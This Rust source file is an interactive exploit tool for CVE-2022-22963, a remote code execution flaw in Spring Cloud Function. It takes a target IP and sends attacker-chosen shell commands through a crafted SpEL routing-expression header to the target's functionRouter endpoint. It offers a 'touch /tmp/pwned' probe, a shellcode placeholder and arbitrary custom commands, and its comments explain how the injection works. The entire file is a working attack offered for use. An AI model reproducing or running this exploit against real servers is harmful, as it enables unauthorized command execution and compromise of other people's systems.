#![allow(non_snake_case)]
use std::io::{stdin, stdout, Write};
use reqwest::header::{HeaderMap, HeaderValue};
use std::error::Error;
use colored::*;
use tokio;

#[tokio::main]
async fn main() -> Result<(), Box<dyn Error>> {
    display_welcome_message();
    let ip = get_ip_address();

    loop {
        display_menu();
        let choice = get_user_choice();

        match choice.as_str() {
            "1" => {
                let touch_command = "touch /tmp/pwned";
                send_command(&ip, touch_command).await?;
            }
            "2" => {
                let shellcode_command = "<shell_code>";
                send_command(&ip, shellcode_command).await?;
            }
            "3" => {
                let custom_command = get_custom_command();
                send_command(&ip, &custom_command).await?;
            }
            cmd if cmd == "Quit" || cmd == "quit" || cmd == "exit" => {
                println!("Quitting...");
                break;
            }
            _ => {
                println!("Invalid choice, please try again.");
            }
        }
    }

    Ok(())
}

async fn send_command(ip: &str, command: &str) -> Result<(), String> {
    // This will be the base URL of the target server running the vulnerable Spring Cloud Function application
    let url = format!("http://{}:8080/functionRouter", ip);

    /*  Format the routing_expression with the provided command
    This crafted Spring Expression (SpEL) is exploiting the vulnerability in the routing functionality
    T(java.lang.Runtime).getRuntime().exec() is used to execute the provided command on the target system
    The resulting SpEL will be injected into the HTTP header and sent to the target server*/
    let routing_expression = format!("T(java.lang.Runtime).getRuntime().exec(\"{}\")", command);

    /*  Create a new HeaderMap and insert the crafted routing_expression as the value of the
    'spring.cloud.function.routing-expression' header
    This header is used by the Spring Cloud Function routing functionality, and the malicious SpEL will
    trigger the vulnerability when the server processes the routing-expression */
    let mut headers = HeaderMap::new();
    headers.insert(
        "spring.cloud.function.routing-expression",
        HeaderValue::from_str(&routing_expression).map_err(|e| e.to_string())?,
    );

    /*  Initialize a new reqwest client
    This client will be used to send HTTP requests to the target server */
    let client = reqwest::Client::new();

    /*  Send an HTTP POST request to the target URL with the malicious headers and a body containing "data"
    The target server will process the routing-expression in the 'spring.cloud.function.routing-expression'
    header, triggering the vulnerability and executing the provided command on the server */
    let response = client
        .post(&url)
        .headers(headers)
        .body("data")
        .send()
        .await
        .map_err(|e| e.to_string())?;

    if response.status().is_success() {
        println!("Status: {}", response.status());
        println!("Headers:\n{:?}", response.headers());
        Ok(())
    } else {
        Err(format!("Error executing command '{}': {}", command, response.status()))
    }
}

fn get_custom_command() -> String {
    print!("Enter your custom command: ");
    let _ = stdout().flush();

    let mut command = String::new();
    stdin().read_line(&mut command).expect("Failed to read input");
    command.trim().to_string()
}

fn get_ip_address() -> String {
    let mut ip = String::new();
    print!("Enter IP address: ");
    let _ = stdout().flush();
    stdin().read_line(&mut ip).expect("Failed to read input");
    ip.trim().to_string()
}

fn get_user_choice() -> String {
    print!("Enter your choice: ");
    let _ = stdout().flush();

    let mut choice = String::new();
    stdin().read_line(&mut choice).expect("Failed to read input");
    choice.trim().to_string()
}

fn display_menu() {
    println!("{}", "\nSelect an option by entering the corresponding number:".bold());
    println!("{}", "1. Test if Spring Cloud Function is vulnerable".green());
    println!("{}", "2. Shellcode".green());
    println!("{}", "3. Enter custom command".green());
}

fn display_welcome_message() {
    let separator = "++=============================================++";
    let title = "||             CVE-2022-22963                  ||";
    let author = "||              By SourMilk                    ||";
    let tagline = "|| Exploiting with Ferris: Rust's Cyber Claw  ||";

    println!("{}", separator.bold().blue());
    println!("{}", format!("{}{}{}", "|".bold().blue(), "                                           ", "|".bold().blue()));
    println!("{}", title.bold().red());
    println!("{}", format!("{}{}{}", "|".bold().blue(), "                                           ", "|".bold().blue()));
    println!("{}", author.bold().purple());
    println!("{}", format!("{}{}{}", "|".bold().blue(), "                                           ", "|".bold().blue()));
    println!("{}", tagline.bold().green());
    println!("{}", format!("{}{}{}", "|".bold().blue(), "                                           ", "|".bold().blue()));
    println!("{}", separator.bold().blue());
}